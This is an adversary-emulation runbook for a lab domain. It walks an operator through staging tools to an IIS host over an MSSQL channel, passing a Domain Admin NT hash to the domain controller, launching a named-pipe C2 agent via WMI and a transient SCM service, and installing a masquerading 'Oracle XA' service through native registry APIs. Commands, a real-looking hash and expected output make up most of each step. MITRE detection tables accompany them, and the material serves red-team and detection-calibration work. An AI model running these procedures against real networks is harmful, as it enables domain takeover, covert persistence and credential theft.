# Phase 4 - Lateral Movement to DC, SMB Pipe C2 Persistence, and NTDS Credential Dump

<!-- CTI references used in this phase. Number them here; cite with [N] in the Reference Tables below. -->

---

## Step 0 - Setup

### Procedures

- Verify Phase 3 completion - Domain Admin NTLM hash extracted from LSASS dump
- Verify TONESHELL C2 session active on WS01 (10.12.10.30) as `TESTLAB\labuser`
- Verify xp_cmdshell + MSSQL channel operational to IIS01 (10.12.10.20)
- Record Domain Admin credentials from Phase 3 output:

  | Account | NT Hash |
  |---|---|
  | `TESTLAB\Administrator` | `<hash from Phase 3 Step 4>` |

- Build `smbpipe-agent.exe` if not already built - see [`resources/payloads/lateral-movement/smbpipe-agent/README.md`](../resources/payloads/lateral-movement/smbpipe-agent/README.md)
- Build `smbpipe-agent-svc.exe` if not already built - see [`resources/payloads/lateral-movement/smbpipe-agent-svc/README.md`](../resources/payloads/lateral-movement/smbpipe-agent-svc/README.md)
- Build `PolicySyncSvc.exe` if not already built - see [`resources/payloads/cred-access/NtdsRawDump/README.md`](../resources/payloads/cred-access/NtdsRawDump/README.md)
- Build `NtServiceInstaller.exe` if not already built - see [`resources/payloads/persistence/windows-service/syscalls-cpp/`](../resources/payloads/persistence/windows-service/syscalls-cpp/)
- Stage all five tool binaries to the controlServer `toneshell` payloads subdirectory (required by `xpstage-hex`):

  ```bash
  cp resources/payloads/lateral-movement/go-thehash/go-thehash.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/go-thehash.exe
  cp resources/payloads/lateral-movement/smbpipe-agent/smbpipe-agent.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/smbpipe-agent.exe
  cp resources/payloads/lateral-movement/smbpipe-agent-svc/smbpipe-agent-svc.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/smbpipe-agent-svc.exe
  cp resources/payloads/cred-access/NtdsRawDump/PolicySyncSvc.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/PolicySyncSvc.exe
  cp resources/payloads/persistence/windows-service/syscalls-cpp/NtServiceInstaller.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/NtServiceInstaller.exe
  ```

- Verify DC01 is reachable from IIS01 on TCP 445:

  ```
  xpexec powershell -c "Test-NetConnection -ComputerName DC01 -Port 445 -InformationLevel Quiet"
  ```

---

## Step 1 - Staging: Transfer Tools to IIS01 via MSSQL DB Channel

### Voice Track

With the Domain Administrator's NTLM hash in hand from the Phase 3 LSASS dump, the adversary prepares for lateral movement to the domain controller. Five tools are staged to IIS01 through the established covert database channel: `go-thehash.exe` — a Pass-the-Hash SMB toolkit that authenticates via NTLMv2 using raw NT hashes; `smbpipe-agent.exe` — a lightweight named-pipe C2 agent; `smbpipe-agent-svc.exe` — the same pipe agent with a service-aware start path so it can be launched through the Service Control Manager and survive as SYSTEM; `PolicySyncSvc.exe` — a credential-dump tool that harvests `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` via raw NTFS cluster reads from a VSS shadow copy; and `NtServiceInstaller.exe` — a persistence tool that registers a Windows service directly through native NT registry APIs. All five binaries are transferred using the same covert database channel proven in Phases 2 and 3 — in-process on IIS01 with no PowerShell spawn.

### Procedures

1. ☣️ Stage `go-thehash.exe` to IIS01 via the DB channel:

   ```
   xpstage-hex go-thehash.exe
   ```

   - ***Expected Output***
     ```text
     [+] xpstage-hex done → C:\ProgramData\go-thehash.exe
     ```

2. ☣️ Stage `smbpipe-agent.exe` to IIS01 via the DB channel:

   ```
   xpstage-hex smbpipe-agent.exe
   ```

   - ***Expected Output***
     ```text
     [+] xpstage-hex done → C:\ProgramData\smbpipe-agent.exe
     ```

3. ☣️ Stage `PolicySyncSvc.exe` to IIS01 via the DB channel:

   ```
   xpstage-hex PolicySyncSvc.exe
   ```

   - ***Expected Output***
     ```text
     [+] xpstage-hex done → C:\ProgramData\PolicySyncSvc.exe
     ```

4. ☣️ Stage `NtServiceInstaller.exe` to IIS01 via the DB channel:

   ```
   xpstage-hex NtServiceInstaller.exe
   ```

   - ***Expected Output***
     ```text
     [+] xpstage-hex done → C:\ProgramData\NtServiceInstaller.exe
     ```

5. ☣️ Stage `smbpipe-agent-svc.exe` to IIS01 via the DB channel:

   ```
   xpstage-hex smbpipe-agent-svc.exe
   ```

   - ***Expected Output***
     ```text
     [+] xpstage-hex done → C:\ProgramData\smbpipe-agent-svc.exe
     ```

6. Verify all five binaries landed on IIS01:

   ```
   xpfile exists C:\ProgramData\go-thehash.exe
   xpfile exists C:\ProgramData\smbpipe-agent.exe
   xpfile exists C:\ProgramData\PolicySyncSvc.exe
   xpfile exists C:\ProgramData\NtServiceInstaller.exe
   xpfile exists C:\ProgramData\smbpipe-agent-svc.exe
   ```

### Reference Tables

<!-- xpstage-hex mechanism behaviors (TONESHELL FILE_DOWNLOAD → sqlcmd INSERT → T-SQL ADODB.Stream decode → cleanup) are identical to Phase 2 Step 4 and are not re-scored here. Five xpstage-hex cycles - go-thehash.exe, smbpipe-agent.exe, PolicySyncSvc.exe, NtServiceInstaller.exe, smbpipe-agent-svc.exe. -->

---

## Step 2 - Lateral Movement: Pass-the-Hash Tool Upload to DC01 via SMB Admin Share

### Voice Track

The adversary executes `go-thehash.exe` on IIS01 — dispatched directly via sp_OA with no `cmd.exe` spawn — to move laterally to DC01. The tool authenticates using only the raw NT hash extracted from LSASS in Phase 3, bypassing any need for a plaintext password. Through DC01's ADMIN$ administrative share, it deposits `smbpipe-agent.exe`, `smbpipe-agent-svc.exe`, `PolicySyncSvc.exe`, and `NtServiceInstaller.exe` to `C:\Windows\Temp\` — the staging location for the execution chain that follows.

### Procedures

1. ☣️ Upload `smbpipe-agent.exe` to DC01 via Pass-the-Hash:

   ```
   xprun-out C:\ProgramData\go-thehash.exe put DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ Temp\smbpipe-agent.exe C:\ProgramData\smbpipe-agent.exe
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded XXXX bytes → \\ADMIN$\ADMIN$\Temp\smbpipe-agent.exe
     ```

2. ☣️ Upload `PolicySyncSvc.exe` to DC01 via Pass-the-Hash:

   ```
   xprun-out C:\ProgramData\go-thehash.exe put DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ Temp\PolicySyncSvc.exe C:\ProgramData\PolicySyncSvc.exe
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded XXXX bytes → \\ADMIN$\ADMIN$\Temp\PolicySyncSvc.exe
     ```

3. ☣️ Upload `NtServiceInstaller.exe` to DC01 via Pass-the-Hash:

   ```
   xprun-out C:\ProgramData\go-thehash.exe put DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ Temp\NtServiceInstaller.exe C:\ProgramData\NtServiceInstaller.exe
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded XXXX bytes → \\ADMIN$\ADMIN$\Temp\NtServiceInstaller.exe
     ```

4. ☣️ Upload `smbpipe-agent-svc.exe` to DC01 via Pass-the-Hash:

   ```
   xprun-out C:\ProgramData\go-thehash.exe put DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ Temp\smbpipe-agent-svc.exe C:\ProgramData\smbpipe-agent-svc.exe
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded XXXX bytes → \\ADMIN$\ADMIN$\Temp\smbpipe-agent-svc.exe
     ```

5. Verify all four binaries landed on DC01:

   ```
   xprun-out C:\ProgramData\go-thehash.exe ls DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ Temp smbpipe-agent.exe smbpipe-agent-svc.exe PolicySyncSvc.exe NtServiceInstaller.exe
   ```

### Reference Tables

<!-- EfsPotato SYSTEM-token capture + CreateProcessWithTokenW spawn of go-thehash.exe is identical to Phase 2 Step 4B (T1134.001 / T1134.002) and is not re-scored here. Every xprun-out invocation of go-thehash.exe in this phase runs through that same primitive, but via sp_OA WScript.Shell.Run (no cmd.exe spawn from SQL Server). -->

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| go-thehash.exe NTLMv2 Pass-the-Hash authentication to DC01 SMB2 TCP 445 | Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | On DC01: Security 4624 Logon Type 3 with LogonProcess=`NtLmSsp`, Account=`TESTLAB\Administrator`, SourceAddress=`10.12.10.20` (IIS01), and elevated token elevation level, where TESTLAB\Administrator has no corresponding Type 2/interactive logon session from that member-server IP in baseline | Calibrated - Not Benign | - | `go-thehash.exe` on IIS01 (run via sp_OA WScript.Shell.Run as `NT SERVICE\MSSQL$SQLEXPRESS` — no cmd.exe) authenticates to DC01 via NTLMv2 using Domain Admin NT hash over SMB2 TCP 445 - Logon Type 3 with no corresponding interactive logon session for this hash | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| go-thehash.exe SMB2 ADMIN$ TreeConnect to DC01 remote service access | Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | On DC01: Security 5145/5140 share access to share name `ADMIN$` with ShareName\\Path resolving under `C:\Windows`, Account=`TESTLAB\Administrator`, SourceAddress=`10.12.10.20` - admin-share TreeConnect from a member-server IP where baseline shows no member-server writes to DC01's ADMIN$ | Calibrated - Not Benign | - | `go-thehash.exe` on IIS01 connects to `\\DC01\ADMIN$` via SMB2 TreeConnect using Domain Admin NT hash - administrative share remote service access from a server-role host | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| go-thehash.exe SMB2 ADMIN$ writes smbpipe-agent.exe, smbpipe-agent-svc.exe, PolicySyncSvc.exe, and NtServiceInstaller.exe to C:\Windows\Temp\ on DC01 | Lateral Movement | T1570 | Lateral Tool Transfer | Windows | On DC01: Sysmon EC=11 file-create of PE binaries `smbpipe-agent.exe`, `smbpipe-agent-svc.exe`, `PolicySyncSvc.exe`, and `NtServiceInstaller.exe` under `C:\Windows\Temp\` within one short window, attributed to the SMB server-side writer context (System/srv2 process) rather than a local interactive user, with no matching local execution creating those paths | Calibrated - Not Benign | - | `go-thehash.exe` on IIS01 writes `smbpipe-agent.exe`, `smbpipe-agent-svc.exe`, `PolicySyncSvc.exe`, and `NtServiceInstaller.exe` to `C:\Windows\Temp\` on DC01 via the ADMIN$ administrative share - PE binary tool transfer to DC01 system directory | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/), [smbpipe-agent-svc](../resources/payloads/lateral-movement/smbpipe-agent-svc/), [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/), [NtServiceInstaller](../resources/payloads/persistence/windows-service/syscalls-cpp/) | - |

---

## Step 3 - Execution: Start Pipe Agent and Establish SMB Pipe C2 Channel

### Voice Track

With the agent binary staged on DC01, the adversary uses `go-thehash.exe exec-wmi` to launch the agent remotely. The tool Pass-the-Hash authenticates to DC01 over DCOM, then invokes `Win32_Process.Create` to start `smbpipe-agent.exe`. The child process appears under a `WmiPrvSE.exe` parent, running as `TESTLAB\Administrator`. On launch, `smbpipe-agent.exe` creates a named pipe at `\\.\pipe\oraclexa` — mimicking an Oracle XA transaction service endpoint — with a DACL granting only Administrators and SYSTEM, and enters a loop waiting for connections. The adversary verifies the C2 channel by routing a `whoami` command through the pipe: `go-thehash.exe pipe` authenticates to DC01 via PtH, connects to `IPC$`, opens the named pipe, exchanges an encrypted command frame, and reads back the output. From the network perspective, this is standard IPC$ traffic on TCP 445.

### Procedures

**A - Start agent via remote WMI process creation**

1. ☣️ Launch the agent on DC01 via WMI `Win32_Process.Create`:

   ```
   xprun-out C:\ProgramData\go-thehash.exe exec-wmi DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "C:\Windows\Temp\smbpipe-agent.exe"
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Process created (PID <n>)
     ```

**B - Verify SMB Pipe C2 channel**

2. ☣️ Send test command through the pipe C2:

   ```
   xprun-out C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "whoami"
   ```

   - ***Expected Output***
     ```text
      [+] Authenticated as TESTLAB\Administrator
      testlab\administrator
      ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| go-thehash.exe DCOM remote activation of WMI on DC01 via Pass-the-Hash | Lateral Movement | T1021.003 | Remote Services: Distributed Component Object Model | Windows | [go-thehash.exe on IIS01] Sysmon EC=3 records outbound TCP to DC01:135 (DCE/RPC endpoint mapper) followed by a second outbound TCP to a DC01 dynamic high port (DCOM-assigned RPC endpoint) within the same short window — member-server initiating DCOM endpoint-mapper resolution to a DC has no baseline in this environment; DC01 auth event scored in T1550.002; process creation on DC01 scored in T1047. | Calibrated - Not Benign | - | `go-thehash.exe` on IIS01 connects to DC01 tcp/135 endpoint mapper, resolves the WMI dynamic RPC endpoint, and authenticates with raw Domain Admin NT hash at RPC packet-privacy level - DCOM transport for remote process creation; no SMB pipe involved in this step | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| go-thehash.exe NTLMv2 Pass-the-Hash authentication to DC01 DCOM RPC endpoint | Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | On DC01: Security 4624 Logon Type 3 with LogonProcess=`NtLmSsp`, Account=`TESTLAB\Administrator`, SourceAddress=`10.12.10.20` (IIS01) correlated with the tcp/135 + dynamic RPC port pair in network telemetry from IIS01 - same account and source-IP as Step 2's SMB PtH logon but over DCOM/RPC transport; elevated token with no corresponding interactive logon session from that server IP | Calibrated - Not Benign | - | `go-thehash.exe` on IIS01 (run via sp_OA WScript.Shell.Run as `NT SERVICE\MSSQL$SQLEXPRESS`) authenticates to DC01 DCOM endpoint via NTLMv2 using Domain Admin NT hash at RPC packet-privacy level - Logon Type 3 NTLM event on DC01 paired with tcp/135 + dynamic RPC port from IIS01 | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | - |
| go-thehash.exe Win32_Process.Create remote launch of smbpipe-agent.exe on DC01 | Execution | T1047 | Windows Management Instrumentation | Windows | [WmiPrvSE.exe on DC01] spawns `C:\Windows\Temp\smbpipe-agent.exe` as a child process and WMI-Activity Operational log on DC01 records a remote `Win32_Process.Create` operation from client IIS01 (10.12.10.20) - baseline: WmiPrvSE.exe rarely spawns children and never from member-server sources. | Calibrated - Not Benign | - | `go-thehash.exe` on IIS01 PtH authenticates to DC01 over DCOM (tcp/135 endpoint mapper + dynamic RPC port, packet privacy) and invokes `Win32_Process.Create` with `CommandLine=C:\Windows\Temp\smbpipe-agent.exe` - child spawned with parent `WmiPrvSE.exe`, running as `TESTLAB\Administrator` in the caller's context | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/) | - |
| smbpipe-agent.exe creates named pipe \\.\pipe\oraclexa masquerading as Oracle XA service endpoint | Stealth | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | [smbpipe-agent.exe on DC01] Sysmon EC=17 PipeCreated for `\\.\pipe\oraclexa` where creator image is a non-system binary in `C:\Windows\Temp` and the pipe DACL grants only BA/SY - pipe name mimics an Oracle XA transaction endpoint while the creator path contradicts any legitimate Oracle service installation. | Calibrated - Not Benign | - | `smbpipe-agent.exe` (spawned by `WmiPrvSE.exe`, running as `TESTLAB\Administrator`) creates named pipe `\\.\pipe\oraclexa` with DACL `BA/SY`-only and enters accept loop - pipe name mimics Oracle XA transaction service | DC01 (TBD) | TESTLAB\Administrator | [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/) | - |
| go-thehash.exe SMB2 named pipe open and framed request-response over \\DC01\pipe\oraclexa | Command and Control | T1095 | Non-Application Layer Protocol | Windows | [smbpipe-agent.exe on DC01] Security 5145 records IPC$ share access from SourceAddress=`10.12.10.20` (IIS01 / go-thehash.exe) targeting `pipe\oraclexa`, and Sysmon EC=18 PipeConnected fires for `\\.\pipe\oraclexa` in `smbpipe-agent.exe` — named pipe serves as C2 transport in place of any application-layer protocol; baseline: DC01 receives no IPC$ named-pipe connections from member-server IPs in normal operation. | Calibrated - Not Benign | - | `go-thehash.exe` on IIS01 PtH authenticates to DC01, TreeConnects `IPC$`, opens `\\DC01\pipe\oraclexa` via SMB2 Create (polling 10 ms on `STATUS_PIPE_BUSY`), then exchanges custom length-prefixed byte-mode frames over SMB2 Read/Write inside one session - C2 protocol rides a named pipe, not an application-layer protocol | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/) | - |
| go-thehash/smbpipe-agent X25519 ECDH key agreement deriving per-connection AES session keys | Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | N/A - C3: X25519 ECDH key-agreement salt exchange is transmitted inside the named pipe channel; pipe byte content is off the declared EDR surface. | Not Calibrated - Not Benign | out-of-surface | Client sends a plaintext `[len=16][salt]` frame immediately after pipe open; both sides derive two directional AES-256-GCM keys via HKDF-SHA256 over a static-static X25519 ECDH secret - peer keys pinned into both binaries at build time; only the salt is visible on the wire | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/) | - |
| go-thehash/smbpipe-agent AES-256-GCM sealed command and output frames over pipe | Command and Control | T1573.001 | Encrypted Channel: Symmetric Cryptography | Windows | N/A - C3: AES-256-GCM frame structure and high-entropy envelope pattern are inside the named pipe channel; pipe byte content is off the declared EDR surface. | Not Calibrated - Not Benign | out-of-surface | All traffic after the handshake is `[4-byte len][12-byte nonce][ciphertext+16-byte tag]` AES-256-GCM frames - length header as AEAD associated data, nonce = random prefix ‖ monotonic counter; command and output contents opaque to passive network capture | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/) | - |
| smbpipe-agent.exe cmd.exe /c child process spawn for pipe command execution on DC01 | Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | [smbpipe-agent.exe on DC01] Sysmon EC=1 process-create of `cmd.exe` with parent image `C:\Windows\Temp\smbpipe-agent.exe` and grandparent `WmiPrvSE.exe` - cmd.exe spawned from a Temp-directory binary under WmiPrvSE.exe lineage; baseline: WmiPrvSE.exe never spawns non-system children that in turn spawn cmd.exe in normal operation. | Calibrated - Not Benign | - | `smbpipe-agent.exe` (running as `TESTLAB\Administrator` under `WmiPrvSE.exe`) decrypts the received pipe command frame and spawns `cmd.exe /c <command>` to execute it, capturing combined stdout/stderr - first observable cmd.exe spawn from the pipe agent on DC01 | DC01 (TBD) | TESTLAB\Administrator | [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/) | - |

---

## Step 3B - Execution: Alternative Agent Launch via SCM Service

### Voice Track

Beyond the WMI path, the adversary demonstrates a second, independent remote-execution primitive against the same DC01 foothold — service execution through the Service Control Manager — both to vary its technique footprint and to land an agent in a higher-integrity context. `go-thehash.exe exec` authenticates to DC01 via Pass-the-Hash, binds DCE/RPC to the SCM endpoint (`\pipe\svcctl`) over `IPC$`, and creates a transient service whose `ImagePath` points at `C:\Windows\Temp\smbpipe-agent-svc.exe`. The SCM starts the service, spawning the binary as `NT AUTHORITY\SYSTEM` under `services.exe`. The agent recognizes a service start and immediately re-launches its own image as a detached, console-less process, then exits the SCM-owned process — so the ~30 s SCM start timeout terminates only the original process while the real agent keeps running as SYSTEM, reparented outside the service tree. The tool then deletes the service registration. The surviving agent creates a second named pipe at `\\.\pipe\oraclexa_svc` — a name distinct from the WMI-launched `\\.\pipe\oraclexa` so both channels can coexist — and the adversary confirms it with a `whoami`, which now returns `nt authority\system` rather than the Administrator context of Step 3.

### Procedures

1. ☣️ Launch the service-capable agent on DC01 through SCM service execution:

   ```
   xprun-out C:\ProgramData\go-thehash.exe exec DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "C:\Windows\Temp\smbpipe-agent-svc.exe"
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [*] Service '<random-12-char>' created, starting...
     [!] Service start timed out (expected - command was dispatched)
     [+] Service '<random-12-char>' deleted
     ```

2. ☣️ Verify the SYSTEM-level pipe C2 channel:

   ```
   xprun-out C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa_svc "whoami"
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     nt authority\system
     ```

### Reference Tables

<!-- AES-256-GCM framing primitives (T1573.001 / T1573.002) and the cmd.exe /c execution path (T1059.003) on the oraclexa_svc channel are identical to Step 3 and are not re-scored here. The T1550.002 PtH logon and T1021.002 IPC$ TreeConnect primitives that carry this step's go-thehash.exe invocations are identical to Step 2/3 and are not re-scored here. -->

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| go-thehash.exe exec MS-SCMR transient service creation and start on DC01 | Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | On DC01: Security 5145 (Detailed File Share) records access to the SCM named pipe (`RelativeTargetName` ending `svcctl`) under share `IPC$` with Account=`TESTLAB\Administrator`, SourceAddress=`10.12.10.20` (IIS01) - remote SCM RPC bind over SMB IPC$ from a member-server IP; baseline: DC01 receives no `svcctl` pipe access from member-server IPs | Not Calibrated - Not Benign | remote-exec | `go-thehash.exe` on IIS01 (run via sp_OA WScript.Shell.Run as `NT SERVICE\MSSQL$SQLEXPRESS` — no cmd.exe) authenticates to DC01 via Pass-the-Hash, binds DCE/RPC to `\pipe\svcctl`, and calls `CreateServiceW` with a random 12-character name and `ImagePath=C:\Windows\Temp\smbpipe-agent-svc.exe`, then `StartService` and `DeleteService` - transient service execution from a member-server IP with no SCM activity in baseline | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent-svc](../resources/payloads/lateral-movement/smbpipe-agent-svc/) | - |
| go-thehash.exe exec MS-SCMR transient service creation and start on DC01 | Execution | T1569.002 | System Services: Service Execution | Windows | On DC01: System 7045 records a new service install whose ImagePath is `C:\Windows\Temp\smbpipe-agent-svc.exe` (a user-writable Temp-directory binary) with a random lowercase 12-character ServiceName, correlated with Security 4697 and a child process spawned under `services.exe` as `NT AUTHORITY\SYSTEM` - service execution with a Temp-path binary; baseline: DC01 service installs never point at C:\Windows\Temp | Calibrated - Not Benign | - | `go-thehash.exe` on IIS01 (run via sp_OA WScript.Shell.Run as `NT SERVICE\MSSQL$SQLEXPRESS` — no cmd.exe) authenticates to DC01 via Pass-the-Hash, binds DCE/RPC to `\pipe\svcctl`, and calls `CreateServiceW` with a random 12-character name and `ImagePath=C:\Windows\Temp\smbpipe-agent-svc.exe`, then `StartService` and `DeleteService` - transient service execution from a member-server IP with no SCM activity in baseline | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent-svc](../resources/payloads/lateral-movement/smbpipe-agent-svc/) | - |
| smbpipe-agent-svc.exe self-relaunch detached orphaning the SYSTEM process | Stealth | T1036.009 | Masquerading: Break Process Trees | Windows | On DC01: Sysmon EC=1 shows `smbpipe-agent-svc.exe` (itself a child of `services.exe`) spawning a child of its own image and the parent exiting in the same window, leaving the child reparented outside the services.exe tree - self-re-spawn that breaks the service process tree; baseline: service binaries do not re-execute themselves detached | Calibrated - Not Benign | - | `smbpipe-agent-svc.exe` (started by `services.exe` as `NT AUTHORITY\SYSTEM`) re-launches its own image with `DETACHED_PROCESS` and exits, so the ~30 s SCM start-timeout terminates only the original process while the detached child survives as SYSTEM, reparented outside the service process tree | DC01 (TBD) | NT AUTHORITY\SYSTEM | [smbpipe-agent-svc](../resources/payloads/lateral-movement/smbpipe-agent-svc/) | - |
| smbpipe-agent-svc.exe creates named pipe \\.\pipe\oraclexa_svc | Stealth | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | On DC01: Sysmon EC=17 PipeCreated for `\\.\pipe\oraclexa_svc` where the creator image is `C:\Windows\Temp\smbpipe-agent-svc.exe` (non-system, Temp-dir binary) and the pipe DACL grants only BA/SY - pipe name mimics an Oracle XA transaction endpoint while the creator path contradicts any legitimate Oracle service installation | Calibrated - Not Benign | - | `smbpipe-agent-svc.exe` (running as `NT AUTHORITY\SYSTEM` after detaching) creates named pipe `\\.\pipe\oraclexa_svc` with a BA/SY-only DACL and enters its accept loop - a second Oracle XA-masquerading pipe, distinct name from the WMI-launched `\\.\pipe\oraclexa` | DC01 (TBD) | NT AUTHORITY\SYSTEM | [smbpipe-agent-svc](../resources/payloads/lateral-movement/smbpipe-agent-svc/) | - |
| go-thehash.exe pipe SMB2 IPC$ open of \\.\pipe\oraclexa_svc returning whoami as SYSTEM | Command and Control | T1095 | Non-Application Layer Protocol | Windows | On DC01: Security 5145 records IPC$ share access from SourceAddress=`10.12.10.20` (IIS01 / go-thehash.exe) targeting `pipe\oraclexa_svc`, and Sysmon EC=18 PipeConnected fires for `\\.\pipe\oraclexa_svc` in `smbpipe-agent-svc.exe` - named pipe serves as C2 transport in place of any application-layer protocol; baseline: DC01 receives no IPC$ named-pipe connections from member-server IPs | Calibrated - Not Benign | - | `go-thehash.exe` on IIS01 PtH-authenticates to DC01, TreeConnects `IPC$`, opens `\\DC01\pipe\oraclexa_svc` via SMB2 Create, exchanges an encrypted command/response frame, and reads back `nt authority\system` - second named-pipe C2 channel, now in SYSTEM context | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent-svc](../resources/payloads/lateral-movement/smbpipe-agent-svc/) | - |

---

## Step 4 - Persistence: Registry-Backed Windows Service on DC01

### Voice Track

With the pipe C2 channel verified, the adversary establishes persistence on DC01 by registering the pipe agent as a permanent Windows service - but without calling `CreateServiceW`. A command sent through the pipe executes `NtServiceInstaller.exe`, which opens `\Registry\Machine\SYSTEM\CurrentControlSet\Services`, creates a service subkey, and writes the service configuration using native NT registry APIs (`NtOpenKey`, `NtCreateKey`, `NtSetValueKey`) - bypassing the Service Control Manager entirely. The service is registered as `OracleXAService` with display name `Oracle XA Transaction Service` - a name chosen to blend with legitimate Oracle database middleware - and `ImagePath` pointing to `C:\Windows\Temp\smbpipe-agent.exe`, `Start = 2` (AutoStart), `ObjectName = LocalSystem`. Because SCM never receives a `CreateServiceW` request, no System Event ID 7045 is generated; the only artifact is the service registry key itself, and the service does not appear in SCM until reboot or a manual service-database refresh.

### Procedures

1. ☣️ Install the pipe agent as a registry-backed Windows service via NT native APIs:

   ```
   xprun-out C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "C:\Windows\Temp\NtServiceInstaller.exe install C:\Windows\Temp\smbpipe-agent.exe OracleXAService \"Oracle XA Transaction Service\" \"Oracle XA transaction service endpoint\""
   ```

   - ***Expected Output***
     ```text
     Service key created (disposition: <n>)
     Service 'OracleXAService' installed successfully via NT syscalls
     Note: Service requires system reboot or manual SCM refresh to appear
     ```

2. Verify the service registry configuration:

   ```
   xprun-out C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "reg query HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService /v ImagePath & reg query HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService /v Start"
   ```

   - ***Expected Output***
     ```text
     ImagePath    REG_SZ    C:\Windows\Temp\smbpipe-agent.exe
     Start        REG_DWORD 0x2
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
